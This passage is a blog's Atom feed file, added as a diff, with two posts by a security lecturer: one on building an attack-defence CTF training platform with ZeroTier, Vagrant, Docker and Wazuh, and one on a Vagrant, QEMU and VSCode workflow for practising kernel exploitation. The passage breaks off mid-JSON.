@@ -1,0 +1,1982 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-02-01T04:14:55-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">baesenseii@cyber</title><subtitle>Offensive Security &amp; Infrastructure Automation</subtitle><author><name>baesenseii</name></author><entry><title type="html">Bringing back the old school: Good ol’ Attack-Defense CTF Environments</title><link href="http://localhost:4000/posts/old_skool_atkdef_251292cc/" rel="alternate" type="text/html" title="Bringing back the old school: Good ol’ Attack-Defense CTF Environments" /><published>2025-03-21T00:00:00-05:00</published><updated>2025-03-21T00:00:00-05:00</updated><id>http://localhost:4000/posts/old_skool_atkdef_251292cc</id><content type="html" xml:base="http://localhost:4000/posts/old_skool_atkdef_251292cc/"><![CDATA[<p>I think this would be one of the most technical and lengthy writeup that I have ever done since The InfoSecurity Challenge 2024 CTF writeups by CSIT.</p>
+<h1 id="preface">Preface</h1>
+
+<p>For those of you who may not know, I “volunteered” to be one of the Worldskills Coaches under the Cyber Security trait to train individuals to represent the polytechnic that I’m working in. Being the ONLY lecturer with CTF/Cybersecurity competition experience, I took up the responsibility of training the students for the CTF component (as it is part of the actual competition based on the technical specs here):</p>
+<ul>
+  <li><a href="http://www.worldskills.sg/docs/default-source/default-document-library/wss2025_technical-description_cybersecurity.pdf?sfvrsn=9fc583ad_0">http://www.worldskills.sg/docs/default-source/default-document-library/wss2025_technical-description_cybersecurity.pdf?sfvrsn=9fc583ad_0</a></li>
+</ul>
+
+<p>While deciding on the training type to use, I thought about this to myself: <em>“Jeopardy CTFs are just too overrated and boring. What happened to the OG CTFs that I used to take part when I was a student?”</em></p>
+
+<p>And that, is when the idea of bringing back a Attack-Defense CTF was born. :)</p>
+<h1 id="brainstorm-phase">Brainstorm Phase</h1>
+<h2 id="jeopardy-ctfs-vs-attack-defense-ctfs">Jeopardy CTFs vs Attack-Defense CTFs</h2>
+
+<p>Not sure how much you know about these two CTF types, but let me just do my take on these CTF modes, along with the pros and cons.</p>
+<h3 id="jeopardy-ctf">Jeopardy CTF</h3>
+
+<p>I am sure many of us in the Cyber scene are familiar with Jeopardy CTFs whereby participants attempt various challenges with one goal in mind: submit the CORRECT flag for the challenge. Based on my observation, I feel that Jeopardy CTFs can achieve the following outcomes:</p>
+
+<ul>
+  <li>
+    <p>Learn a new skill/concept based on the challenge category (e.g pwn -&gt; buffer overflow/ret2win, web -&gt; perform SSTI with WebApps that have blacklist filters)</p>
+  </li>
+  <li>
+    <p>Accelerate transfer of knowledge based on the challenge on an exponential scale, due to the time crunch and gamification of learning.</p>
+  </li>
+</ul>
+
+<p>However, there are its drawbacks (in my humble opinion, many might disagree but please do let me know as this is merely my opinion):</p>
+
+<ul>
+  <li>
+    <p>Based on CTFs that I personally have attended over the years, I feel that there are CTF challenges that were just made to “make life difficult for others to learn”.</p>
+  </li>
+  <li>Real-world scenarios and implementations in most organisations involve a myriad of IT assets, networks and security controls in place. While each CTF challenge covers a specific area of knowledge that the challenge creator wants participants to learn, going up against real-world scenarios and systems involve demonstrating and chaining multiple areas of knowledge in order to solve the problem at hand.
+    <ul>
+      <li>For example, a hacker managed to identify a custom network service that has been identified to have SQL injection and an administrative API call that is susceptible to a buffer overflow attack. So how now?</li>
+    </ul>
+  </li>
+  <li>Based on my experience in teaching students, nowadays the gathering and analysis of information tends to be a daunting task for the students (and most of the time they throw it to GenAI tools like ChatGPT, in hopes that they can “get the answer”).
+    <h3 id="attack-defense-ctfs">Attack-Defense CTFs</h3>
+  </li>
+</ul>
+
+<p>For this CTF, teams are given assets (of various services and vulnerabilities) to defend/harden while attempting to gain access to assets of other teams to score points. This, in my opinion, would the closest thing for participants to experience a red team vs blue team exercise (in fact I would call it ‘almost purple’ because teams are to both attack and defend, and there’s no threat intelligence element)</p>
+
+<p>In terms of knowledge building, AttkDef CTFs primarily focus on the application of known knowledge (e.g hardening/lockdown of servers, securing administration services such as SSH, HTTPS, etc). Of course, depending on the complexity, sometimes network devices are also involved as part of the assets (but i have my reservations on this).</p>
+
+<p>So if you haven’t done any form of server administration, quite frankly doing this CTF as a blue teamer is gonna be tough.</p>
+
+<p>But now, onto its drawbacks:</p>
+<ul>
+  <li>As these involve actual hardware components that make up the infrastructure of the CTF, gamemasters would now have to serve as IT Helpdesk personnel. In my years of playing these type of CTFs, due to the inexperience of some of the teams, issues such as getting locked out from the assets, or restoration of assets due to opposing teams “accidentally” wiping the asset software were pretty common.</li>
+  <li>As all the competitor equipment and their assets all reside within the same physical network, network-based DDoS attacks are a huge cause of concern (despite informing people NOT to do it during the briefings). I remember playing in one of the AttkDef CTFs whereby I wasn’t able to access the web servers of all opposing teams as someone was apparently running a SlowLorris attack.
+    <h3 id="final-decision">Final Decision</h3>
+  </li>
+</ul>
+
+<p>Eventually I decided to use the AttkDef CTF format, as I felt that this CTF format would be very useful to pit the teams against each other in terms of both blue and red teaming skills.</p>
+
+<p>So we got the format up, next are the following questions to answer in order to move forward:</p>
+<ul>
+  <li>What equipment do I have right now?</li>
+  <li>What networks/subnets do I need?</li>
+  <li>How do we keep track of scoring?</li>
+  <li>How many targets will there be for each team? Are the targets unique per team, or duplicates for all teams?</li>
+</ul>
+
+<p>And the most important question to ask while designing this: DO WE HAVE MOOLAH to support this? Well at that point in time, I will definitely have to say.. no.</p>
+<h1 id="design-phase">Design Phase</h1>
+<h2 id="network-diagram-overview">Network Diagram Overview</h2>
+<p>Well the first thing we need to do is to draw up a simple network diagram to understand what components are required in this case:</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320211839.png" alt="" /></p>
+
+<p>As a description of what this diagram is about:</p>
+<ul>
+  <li>Only two teams will be playing this exercise, with each team having his/her own attacker network, defender network, and a set of targets.</li>
+  <li>A scoreboard will be created to check the status of the applications hosted on the target network (both Team 1 and Team 2).</li>
+  <li>All app servers are configured with Wazuh agents + Snort IDS to improve detection rules.</li>
+  <li>Both teams will have a Wazuh XDR SIEM for them to practise their detection capabilities.</li>
+  <li>And ALL of these machines and networks are to be used on ONE powerful server (because I do not have the luxury to have MULTIPLE powerful servers)</li>
+</ul>
+
+<p>In terms of the network access control measures, here’s a scuffed access control matrix table to give you some clarity on how the firewall rules are to be implemented in the KOTH-ROUTER (or just a core router in general):</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th><strong>Attacker Network (Team 1)</strong></th>
+      <th><strong>Defender Network (Team 1)</strong></th>
+      <th><strong>Target Network (Team 1)</strong></th>
+      <th><strong>Attacker Network (Team 2)</strong></th>
+      <th><strong>Defender Network (Team 2)</strong></th>
+      <th><strong>Target Network (Team 2)</strong></th>
+      <th><strong>Scoreboard</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Attacker Network (Team 1)</strong></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>X</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><strong>Defender Network (Team 1)</strong></td>
+      <td> </td>
+      <td> </td>
+      <td>X<br /><br />SSH to app machines via TCP 3222 (as root)</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>X</td>
+    </tr>
+    <tr>
+      <td><strong>Target Network (Team 1)</strong></td>
+      <td>X</td>
+      <td>X</td>
+      <td>X</td>
+      <td>X</td>
+      <td> </td>
+      <td> </td>
+      <td>X</td>
+    </tr>
+    <tr>
+      <td><strong>Attacker Network (Team 2)</strong></td>
+      <td> </td>
+      <td> </td>
+      <td>X</td>
+      <td>X</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><strong>Defender Network (Team 2)</strong></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>X<br /><br />SSH to app machines via TCP 3222 (as root)</td>
+      <td>X</td>
+    </tr>
+    <tr>
+      <td><strong>Target Network (Team 2)</strong></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>X</td>
+      <td>X</td>
+      <td>X</td>
+      <td>X</td>
+    </tr>
+    <tr>
+      <td><strong>Scoreboard</strong></td>
+      <td> </td>
+      <td>X</td>
+      <td>X</td>
+      <td> </td>
+      <td>X</td>
+      <td>X</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The main VM that will be implementing the network rules is the KOTH_ROUTER VM, which is just simply a Ubuntu Server VM with IP Forwarding + iptables enabled. IPTables will serve as an enforcer of the above access control matrix table, with the default INPUT policy set to ‘DROP’.</p>
+
+<p>At this stage the design seems like a good idea, but there’s just one problem: The server that I wanted to use was located in one of the Level 6 labs where it was such a big hassle to move it to the training area (which was at Level 2). The last time I pushed this rack to do an on-site CTF, the wheels were badly damaged due to the flooring and the equipment was left untouched for quite a significant amount of time. So we need to find a way to figure out how we can connect these users to this server:</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320214904.png" alt="" /></p>
+
+<h2 id="introduction-to-software-defined-networking-sdn-platforms">Introduction to Software Defined Networking (SDN) Platforms</h2>
+
+<p>Honestly speaking, I didn’t knew at first what SDN meant, even though I kept hearing this buzzword so many times when I was conducting an ‘Introduction to 5G’ workshop for external clients. I know what it does in terms of high-level, but didn’t know of any examples until I realised that I have been using ONE before:</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320215647.png" alt="" /></p>
+
+<p>Back in the days before Steam, whenever my friends and I wanted to play Counter-Strike together, we would use this Hamachi VPN in order for us to connect to the Counter-Strike server hosted by one of my friends. How it works is that:</p>
+<ul>
+  <li>It is required to sign up for an account in Hamachi VPN so that you can get a Hamachi ID.</li>
+  <li>Install Hamachi VPN on your system.</li>
+  <li>Create a Hamachi Network ID and share it with your friends.</li>
+  <li>Your friends join in your network via the Hamachi Network ID (in which you will need to approve your friend who is joining into the network)</li>
+  <li>You can now communicate with each other based on the IP address provided by Hamachi VPN, as long as your device is <strong>connected to the Internet :)</strong></li>
+</ul>
+
+<p>In other words, SDN platforms like Hamachi allows for privatised peer-to-peer networks, and users can create it with no extra cost. However, this absence of cost does comes with limitations, in which if you would want to expand it you will have to pay for it. For Hamachi, I can only have up to 5 Hamachi users across all the Hamachi Networks that I own, which kinda sucks to be honest as i do want to consider at least like a 3v3 matchup for the platform.</p>
+
+<p>So this led to me in researching for other SDN alternatives, and I came across this SDN called ZeroTier (https://www.zerotier.com):</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320221553.png" alt="" /></p>
+
+<p>Based on the pricing, it seems that the Basic version allows me to connect up to 10 devices across 3 networks. However, this kind of contradicts the current Free plan that I am having currently as I can create unlimited networks but up to 25 devices (as shown in the screenshot below):</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320221453.png" alt="" /></p>
+
+<p>However, this can be easily solved by creating more than 1 account to increase the support for network devices and the networks to create, as what really matters at the end of the day is the ZeroTier Network ID. Now what’s even more interesting about ZeroTier is that, unlike Hamachi (to my knowledge), ZeroTier allows you to customise what private subnet that you want to use for the network (which makes it totally awesome as it will help with the network diagram):</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320223621.png" alt="" /></p>
+
+<p>Using ZeroTier, a finalised network diagram was made to include even the ZeroTier IDs to join:</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320223817.png" alt="" /></p>
+
+<p>Do take note of the following:</p>
+<ul>
+  <li>The target networks for both Team 1 and Team 2 are categorised as ‘Internal’ which means that the apps/services are going to be hosted via Vagrant with VirtualBox as the virtualisation engine.</li>
+  <li>I also created a ZeroTier Network for management purposes so that I can SSH directly into the physical server that is hosting the virtualised applications and access all the virtualised machines accordingly using <code class="language-plaintext highlighter-rouge">vagrant ssh</code>
+    <h2 id="getting-internet-access-for-a-standalone-server">Getting Internet Access for a standalone server</h2>
+  </li>
+</ul>
+
+<p>If you had noticed the picture above showing the server used, there is no nearby LAN port whatsoever that allows my server to obtain Internet access. And based on what we discussed in our network diagram, Internet access IS MANDATORY in order to:</p>
+<ul>
+  <li>Establish SD-WAN connections to the ZeroTier networks</li>
+  <li>More importantly, to launch our Vagrant machines (which require the download of Vagrant boxes from the Internet)</li>
+</ul>
+
+<p>The way to solve this solution is pretty simple:</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320225743.png" alt="" /></p>
+
+<p>As you can see here in this picture, notice that there’s a small Raspberry Pi. This device is currently acting like a modem+router using the following approach:</p>
+<ul>
+  <li>WiFi adapter connected to the Guest network in the school premises (just a simple login with my credentials worked fine)</li>
+  <li>
+    <p>In the Raspberry Pi, the following configurations were done:</p>
+
+    <ul>
+      <li>Enable IP forwarding via sysctl</li>
+      <li>Configure a static IP address on the LAN port of the RPi (e.g 10.10.10.1/30)</li>
+      <li>Configure the following iptables rule to perform NAT via the WiFi adapter as the outgoing interface (in this example below it is wlan0):</li>
+    </ul>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  iptables -t nat -A POSTROUTING -j MASQUERADE -o wlan0
+</code></pre></div>    </div>
+
+    <ul>
+      <li>Ensure that it is persistent by installing the ‘iptables-persistent’ package and save the iptable rules (note that i was running Raspbian OS):</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	sudo apt update &amp;&amp; sudo apt install -y iptables-persistent;
+	iptables-save &gt; /etc/iptables/rules.v4
+</code></pre></div></div>
+<h2 id="app-deployment--access-isolation">App Deployment &amp; Access Isolation</h2>
+
+<p>Based on previous experiences of organising CTFs and providing students environments to practise their skills, one thing that stresses me out is the level of access that the participant has to the target machines. Looking at the access control matrix, it can be seen that anyone in the defender network is able to access their own targets (which is allowed of course, in order to allow participants in hardening the server and implement their detection controls via Wazuh).</p>
+
+<p>So the real question remains: do I allow SSH access to the Vagrant machine, or the Docker container?</p>
+
+<p>After much thought, I decided to only allow key-based root SSH access to the Docker container (through TCP 3222) due to the following reasons:</p>
+
+<ul>
+  <li>
+    <p>The attackers, upon gaining initial access to the vulnerable service, would most likely be residing within the Docker container. This means that as a defender, you should perform your hardening and detection controls within the environment that the attacker is going to be in (which is the Docker container itself)</p>
+  </li>
+  <li>
+    <p>TCP port 3222 was selected because of the dynamic port range that Vagrant uses when deploying boxes via SSH (usually within the ranges of 2220 to 2999)</p>
+  </li>
+  <li>
+    <p>From the administrator’s perspective (which is me), if the whole vagrant machine is screwed up, at least i can just SSH directly to the physical server and run <code class="language-plaintext highlighter-rouge">vagrant destroy -f</code> and <code class="language-plaintext highlighter-rouge">vagrant up</code>. This gives me more granular administrative control as compared to the defenders (which makes sense as I am the gamemaster after all)</p>
+  </li>
+</ul>
+
+<p>The diagram below shows an example of how each target application is being deployed within the platform:</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320231654.png" alt="" /></p>
+<h2 id="scoreboard-creation">Scoreboard Creation</h2>
+
+<p>For this, truth be told that I didn’t do much for this component as it took me quite a while to find a good scoreboard system that is based on King of The Hill. However I was lucky enough to come across this repository:</p>
+<ul>
+  <li>https://github.com/InjectionSoftwareandSecurityLLC/Propane</li>
+</ul>
+
+<p>It was pretty intuitive to use as it’s based on Flask, and in this case I had to change the HTML templates a bit to suit to the training environment. Basically if you want to score a point on a target that you have compromised, you are to add the following custom tag in the main page of the web application (the value to specify is configured inside the propane_config.ini file):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;team&gt;faint&lt;/team&gt;
+</code></pre></div></div>
+
+<p>Only one tag is allowed within the page, and if successful, you will see something like this on the compromised target:</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320235241.png" alt="" /></p>
+
+<p>The scoreboard will do a constant poll on the websites hosted on all the targets, and the points will start to increase as long as the tag remains within the index page of the website hosted on TCP 80.</p>
+<h2 id="automated-deployment">Automated Deployment</h2>
+
+<p>Of course, how can I even forget this? Automation is definitely the ultimate form of smart laziness. And thanks to my constant meddling with IaC code via Vagrant and Docker, I created two scripts that would help deploy the platform without any issue (but there are still some manual actions to be done during the deployment process such as authorising the boxes to the ZeroTier networks):</p>
+
+<ul>
+  <li>generator.py - Generates an entire deployment folder (called a project) that dynamically performs the following:
+    <ul>
+      <li>Generation of the IaC files (e.g Vagrantfile, Dockerfile) based on the configuration file provided (config.txt), which also includes the routes and installation/configuration of the Wazuh agents.</li>
+      <li>Generation of the SSH keys used for root access to the Docker containers (for the defenders)</li>
+      <li>Dynamic generation of the IP addresses for the targets (for randomisation purposes)</li>
+    </ul>
+  </li>
+  <li>manager.py - Allows the administrator to start/stop/ssh any Vagrant boxes belonging to the project without the need to specify the Vagrant ID or navigate to the current working directory of the Vagrant machine.</li>
+</ul>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320233257.png" alt="" /></p>
+<h1 id="outcome">Outcome</h1>
+
+<p>Thankfully I had an opportunity to test this deployment out in school with some of the students (mainly for the Worldskills team), and we did have lots of fun in this case:</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320233056.png" alt="" /></p>
+
+<p>*Note: The scoreboard shows the labelling of the targets (e.g T1_Target1 = Target1 machine owned by Team 1). The names with the light blue highlights are the members of the opposing team that managed to hack into the target by planting the following tag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;team&gt;faint&lt;/team&gt;
+</code></pre></div></div>
+
+<p>As I was playing in Team 2, I also took the opportunity to try out establishing a C2 server using Sliver with multiplayer mode enabled (which was sooooo badass to be honest):</p>
+
+<p><img src="/assets/images/attkdef_platform/Pasted image 20250320234349.png" alt="" /></p>
+
+<p>But what made me even more curious was to figure out how we could actually detect the attacks using the Wazuh rules that the team had customised (in addition to the default rulesets), however due to the mood and performance from the other team (based on the scoreboard), I don’t think we managed to get an opportunity to do so.</p>
+<h1 id="thoughts">Thoughts</h1>
+
+<p>As of now, I personally feel that cybersecurity education is too decoupled and heavily focused on blue team elements and not red team elements. Based on my observation, it seems that whenever students learn about the security aspects (e.g auditing, network security, forensics), they do not seem to be convinced on the rationale of the implementations/actions even with the explanations (apart from the fact that it’s part of ‘security best practices’). Therefore, the best way to make students understand the rationale is going through an actual scenario, which is a form of experiential learning.</p>
+
+<p>I personally feel that this platform provides a really good summary exercise for students in cybersecurity to establish the bridge between both aspects of red and blue elements. The funny thing about it is that this is regularly practised in the industry, in the form of Table Top Exercises. So the important question here is, shouldn’t we all be doing it as well?</p>
+
+<p>Just a food for thought on this issue, and I hope that I could encourage more people to try setting up such environments (with my tool hopefully). The public version of this platform is here: https://github.com/baesenseii/atkdef_platform/</p>
+
+<p>Just raise the issues if there’s anything else that needs to fix!</p>]]></content><author><name>baesenseii</name></author><category term="projects" /><category term="attkdef-ctf" /><summary type="html"><![CDATA[I think this would be one of the most technical and lengthy writeup that I have ever done since The InfoSecurity Challenge 2024 CTF writeups by CSIT. Preface For those of you who may not know, I “volunteered” to be one of the Worldskills Coaches under the Cyber Security trait to train individuals to represent the polytechnic that I’m working in. Being the ONLY lecturer with CTF/Cybersecurity competition experience, I took up the responsibility of training the students for the CTF component (as it is part of the actual competition based on the technical specs here): http://www.worldskills.sg/docs/default-source/default-document-library/wss2025_technical-description_cybersecurity.pdf?sfvrsn=9fc583ad_0]]></summary></entry><entry><title type="html">Kernel Exploitation Setup with Vagrant and VSCode</title><link href="http://localhost:4000/posts/kernel_expdev_setup_with_vscode_ee35e20e/" rel="alternate" type="text/html" title="Kernel Exploitation Setup with Vagrant and VSCode" /><published>2025-03-04T00:00:00-06:00</published><updated>2025-03-04T00:00:00-06:00</updated><id>http://localhost:4000/posts/kernel_expdev_setup_with_vscode_ee35e20e</id><content type="html" xml:base="http://localhost:4000/posts/kernel_expdev_setup_with_vscode_ee35e20e/"><![CDATA[<h1 id="preface">Preface</h1>
+<p>As some of you might already know by now, I have been taking quite a fair interest on doing pwn challenges in CTF as part of my goal to improve on my binary exploitation skills.</p>
+
+<p>Back in Dec 2024, I’ve had the privilege to volunteer as a Teaching Assistant for the Advanced Youth Cyber Exploration Programme (AYCEP) which involved participants from various tertiary institutions and academia (JC/Secondary). More details on the programme can be found here: https://www.csa.gov.sg/our-programmes/talent-and-skills-development/sg-cyber-talent/sg-cyber-youth/advanced-youth-cyber-exploration-programme</p>
+
+<p>Long story short, one of the modules covered in the programme was vulnerability research (in the area of binary and KERNEL exploitation), and by far this module destroyed like 99% of the participants (especially when kernelpwn was introduced). As much as the students were lost, I found it very intriguing to learn and started to deep dive into it more.</p>
+
+<h1 id="kernel-exploitation">Kernel Exploitation</h1>
+<h2 id="the-problem">The Problem</h2>
+
+<p>During the programme, the qemu-system tool was used to help emulate kernel environments to run our exploits which were based on vulnerable Linux drivers that were already pre-built into the kernel. The main idea of this exploit is to escalate privileges from a low-privileged user to root privileges based on vulnerabilities identified in the driver (e.g Use-After-Free, Kernel-based Buffer Overflow attacks, etc).</p>
+
+<p>Based on my experience just going through the labs, here are the things that I find it pretty troublesome and annoying to do:
+1) The following tools need to be installed on the debugging system:
+	- musl-gcc =&gt; for compiling exploits
+	- qemu-system =&gt; for kernel environment emulation
+	- gdb =&gt; for kernel debugging (you can use pwndbg or even GEF, take your pick)</p>
+
+<p>2) Every single time the exploit code (in C) is changed, it is required to compile the exploit</p>
+
+<p>3) Next, the ‘exploit’ binary has to be placed inside the ‘initramfs.cpio.gz’ file, which contains all the necessary binaries that define the root filesystem when the kernel boots up.</p>
+
+<p>4) As qemu-system has an in-built functionality to launch gdbserver for remote debugging (‘-s’) + pausing the kernel CPU before the remote debugging is established, due to (3), this will mean that i need to keep on rebooting the kernel after a new ‘initramfs.cpio.gz’ file is generated (which will be like, almost all the time whenever there’s a change in the exploit code).</p>
+
+<p>5) Lately, Visual Studio Code has been my go-to editor due to the extensions (was actively creating Docker images for my teaching content in school), but I have been using it extensively for my exploit code (with the C/C++ intellisense capabilities). In addition I used the Integrated Terminal to run qemu-system and gdb, however it is extremely annoying to keep on launching new tabs and writing the commands again.</p>
+
+<p>6) On top of all that, in the event whereby my debugging machine fails, I seriously do not want to do the installation and configuration of the tools again. -_-“</p>
+<h2 id="the-solution">The Solution</h2>
+
+<h3 id="the-setup">The Setup</h3>
+<p>Do bear in mind that at the time of this documentation, this is all being done on a laptop running Manjaro Linux, along with Vagrant and Visual Studio Code installed. And that is pretty much it to be honest :)</p>
+
+<p>I am sure of those professionals who read this blog will be like “ah this is such a newb setup”, but I am writing this blog post so that others who want to get started on kernel exploitation would be more motivated to think of ways that can help ease the process. :)</p>
+<h3 id="the-1337-scripts-sorta">The 1337 scripts (sorta..)</h3>
+<p>Now for point 6, this is kind of a given. The best way to do this is to set up a debugging VM machine and then export it to an OVA file. However, in order to grant greater flexibility to customise the debugging VM machine, I would think the best way to do it is to use Vagrant (which has been a godsend for me ever since I used it for implementing my CTF infrastructures).</p>
+
+<p>So here’s the Vagrantfile used to create my customisable debugging VM machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># -*- mode: ruby -*-
+# vi: set ft=ruby :
+
+Vagrant.configure("2") do |config|
+  config.vm.box = "ubuntu/jammy64"
+  config.vm.hostname = "pwnvm"
+
+  config.vm.provider "virtualbox" do |vb|
+    vb.memory = "4096"
+  end
+  config.vm.provision "shell", inline: &lt;&lt;-SHELL
+
+  # Add Docker's official GPG key:
+sudo apt-get update
+sudo apt-get -y install ca-certificates curl net-tools
+sudo install -m 0755 -d /etc/apt/keyrings
+sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
+sudo chmod a+r /etc/apt/keyrings/docker.asc
+
+# Add the repository to Apt sources:
+echo \
+  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
+  $(. /etc/os-release &amp;&amp; echo "$VERSION_CODENAME") stable" | \
+  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
+sudo apt-get update
+
+# install the necessary tools needed
+sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin python3-pip gdb vim tmux qemu-system musl-tools
+
+# add the vagrant account to allow access to docker without logging in as root.
+sudo usermod -aG docker vagrant
+
+# installing pwntools
+sudo pip3 install --upgrade pip
+sudo pip3 install pwntools
+
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+sudo ./setup.sh
+echo "source /home/vagrant/pwndbg/gdbinit.py" &gt; /home/vagrant/.gdbinit
+
+  SHELL
+end
+</code></pre></div></div>
+
+<p>For steps 2,3 and 4, I have taken the liberty to create the following wrapper scripts:</p>
+<ul>
+  <li>unzip_cpio.sh (only need to be run once) =&gt; Unzips the contents of the initramfs.cpio.gz file and places it in a newly created folder called ‘initramfs’:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh
+mkdir initramfs
+cd initramfs
+cp ../initramfs.cpio.gz .
+gunzip ./initramfs.cpio.gz
+cpio -idm &lt; ./initramfs.cpio
+rm initramfs.cpio
+</code></pre></div></div>
+
+<ul>
+  <li>recompile-exploit-run.sh =&gt; Performs the compilation of the exploit, loading it into the root filesystem folder before compressing it to ‘initramfs.cpio.gz’. In addition, the script will also attempt to emulate the kernel using Qemu with the necessary debugging options (note that as of now my environment has KASLR disabled. Typical kernel pwn environments would provide a run.sh to launch the environment with Qemu, so do adjust it accordingly):</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh
+
+musl-gcc -o ./initramfs/exploit ./exploit.c -static
+
+cd initramfs
+find . -print0 | cpio -ov --format=newc --null | gzip -9 &gt; ../initramfs.cpio.gz
+cd ../
+
+## If you want to enable debugging mode, uncomment this qemu-system code syntax.
+
+# qemu-system-x86_64 -s -S \
+#     -kernel ./bzImage \
+#     -cpu qemu64,+smep,+smap \
+#     -m 4G \
+#     -smp 2 \
+#     -initrd initramfs.cpio.gz \
+#     -append "console=ttyS0 quiet loglevel=3 nokaslr kpti=1" \
+#     -monitor /dev/null \
+#     -nographic \
+#     -no-reboot \
+
+## If you want to disable debugging mode, uncomment this qemu-system code syntax.
+qemu-system-x86_64 \
+    -kernel ./bzImage \
+    -cpu qemu64,+smep,+smap \
+    -m 4G \
+    -smp 2 \
+    -initrd initramfs.cpio.gz \
+    -append "console=ttyS0 quiet loglevel=3 nokaslr kpti=1" \
+    -monitor /dev/null \
+    -nographic \
+    -no-reboot \
+</code></pre></div></div>
+
+<h3 id="the-secret-vscode-weapon-tasksjson">The Secret VSCode Weapon: tasks.json</h3>
+
+<p>Some of you might already know regarding Visual Studio Code having the Integrated Terminal, which allows users to interface with the Linux terminal without the need to launch the actual Terminal application.  Being the lazy programmer that I am, I started to tinker with VSCode and I discovered this (https://code.visualstudio.com/docs/editor/tasks):</p>
+
+<p><img src="/assets/images/kernelexp101/Pasted image 20250304062808.png" alt="" /></p>
+
+<p>Like every code builder / IDE application, there are bound to be task-related functionalities for programmers to define an automated set of tasks that can be triggered via the click of a button instead of repeatedly typing the commands again and again.</p>
+
+<p>Since all of my kernel development tools reside in the debugger VM via vagrant, I have defined a set of tasks (only for kernel exploitation development) that allows me to run the scripts listed earlier (tasks.json):</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+</span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2.0.0"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"tasks"</span><span class="p">:</span><span class="w"> 
+	</span><span class="p">[</span><span class="w">
+		</span><span class="p">{</span><span class="w">
+			</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Compile exploit and launch kernel (Vagrant)"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">&lt;--</span><span class="w"> </span><span class="err">your</span><span class="w"> </span><span class="err">shell</span><span class="w"> </span><span class="err">here</span><span class="w">
+			</span><span class="nl">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+				</span><span class="s2">"ssh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\"</span><span class="s2">cd /vagrant; bash ./recompile-exploit-run.sh</span><span class="se">\"</span><span class="s2">"</span><span class="w">
+				</span><span class="p">]</span><span class="w">
+		</span><span class="p">},</span><span class="w">
+		</span><span class="p">{</span><span class="w">
+			</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Connect to remote gdbserver via GDB CLI (Vagrant)"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"args"</span><span class="p">:[</span><span class="s2">"ssh"</span><span class="p">,</span><span class="s2">"-c"</span><span class="p">,</span><span class="s2">"gdb -ex=</span><span class="se">\"</span><span class="s2">tar rem :1234</span><span class="se">\"</span><span class="s2">"</span><span class="p">]</span><span class="w">
